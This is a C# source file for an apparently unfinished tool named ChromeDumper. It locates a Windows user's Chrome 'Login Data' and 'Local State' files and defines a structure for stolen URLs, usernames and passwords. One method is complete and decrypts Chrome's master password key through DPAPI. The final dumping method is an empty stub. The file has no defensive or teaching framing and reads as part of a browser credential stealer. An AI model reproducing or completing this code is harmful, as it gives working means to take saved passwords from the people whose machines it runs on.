using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Newtonsoft.Json;
using System.Security.Cryptography;

namespace ChromeDumper
{
    internal class clsDumper
    {
        public string m_szChromeDirectory { get; set; }
        public string m_szLoginDataPath { get { return $"{m_szChromeDirectory}\\User Data\\Default\\Login Data"; } }
        public string m_szLocalState { get { return $"{m_szChromeDirectory}\\User Data\\Local State"; } }

        public clsDumper(string szChromeDirectory)
        {
            m_szChromeDirectory = szChromeDirectory;
        }
        public clsDumper()
        {
            string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
        }

        public struct stCredential
        {
            public string URL { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public DateTime CreationDate { get; set; }
            public DateTime LastUsedDate {  get; set; }
        }

        private bool fnbIsV10(byte[] abData) => Encoding.UTF8.GetString(abData.Take(3).ToArray()) == "v10";

        private byte[] fnabGetKey()
        {
            string szContent = File.ReadAllText(m_szLocalState);
            dynamic dyJson = JsonConvert.DeserializeObject(szContent);
            string szKey = dyJson.os_crypt.encrypted_key;
            byte[] abBinKey = Convert.FromBase64String(szKey).Skip(5).ToArray();

            byte[] abDecryptedKey = ProtectedData.Unprotect(abBinKey, null, DataProtectionScope.CurrentUser);

            return abDecryptedKey;
        }

        public List<stCredential> fnDumpPassword()
        {
            List<stCredential> lc = new List<stCredential>();

            return lc;
        }
    }
}
